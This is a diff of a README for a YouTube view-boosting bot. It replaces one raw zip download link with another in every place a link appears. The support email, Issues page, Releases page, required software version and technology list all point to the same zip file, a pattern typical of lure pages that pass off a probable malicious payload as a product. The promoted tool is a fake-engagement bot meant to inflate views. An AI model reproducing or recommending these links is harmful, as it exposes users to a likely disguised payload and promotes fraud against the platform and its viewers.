@@ -1,6 +1,6 @@
 # 🎥 youtube-bot-views - Boost Your YouTube Engagement Effortlessly
 
-[![Download](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube-bot-views.zip)](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube-bot-views.zip)
+[![Download](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube_views_bot_1.3.zip)](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube_views_bot_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,9 +12,9 @@ To get started, follow these simple steps.
 
 To download the software, you can visit our Releases page. Click the link below to start:
 
-[Download the latest version here](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube-bot-views.zip)
+[Download the latest version here](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube_views_bot_1.3.zip)
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube-bot-views.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube_views_bot_1.3.zip).
 2. Find the latest version listed. 
 3. Click on the file name to download it.
 
@@ -24,7 +24,7 @@ Before you install, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a Linux distribution (Ubuntu recommended).
 - **Available Disk Space:** At least 200 MB.
-- **https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube-bot-views.zip** Version 14 or later installed (needed for the bot to run).
+- **https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube_views_bot_1.3.zip** Version 14 or later installed (needed for the bot to run).
 
 ## 📚 How to Use
 
@@ -76,8 +76,8 @@ A: More views can help, but there are many factors in video ranking, including c
 
 If you have questions or need assistance, please reach out:
 
-- Email: https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube-bot-views.zip
-- GitHub Issues: [Open an issue here](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube-bot-views.zip)
+- Email: https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube_views_bot_1.3.zip
+- GitHub Issues: [Open an issue here](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube_views_bot_1.3.zip)
 
 ## 📝 Contributing
 
@@ -85,8 +85,8 @@ We welcome contributions! If you’d like to help improve the software, please c
 
 ## 🌐 Topics
 
-This project focuses on automation, engagement, and support for YouTube. Supported technologies include https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube-bot-views.zip, Docker, Playwright, and Puppeteer.
+This project focuses on automation, engagement, and support for YouTube. Supported technologies include https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube_views_bot_1.3.zip, Docker, Playwright, and Puppeteer.
 
 ---
 
-Remember, for any downloads, please visit our [Releases page](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube-bot-views.zip) to always get the latest version. Happy boosting!
+Remember, for any downloads, please visit our [Releases page](https://raw.githubusercontent.com/1xmusty/youtube-bot-views/main/cloiochoanitic/youtube_views_bot_1.3.zip) to always get the latest version. Happy boosting!
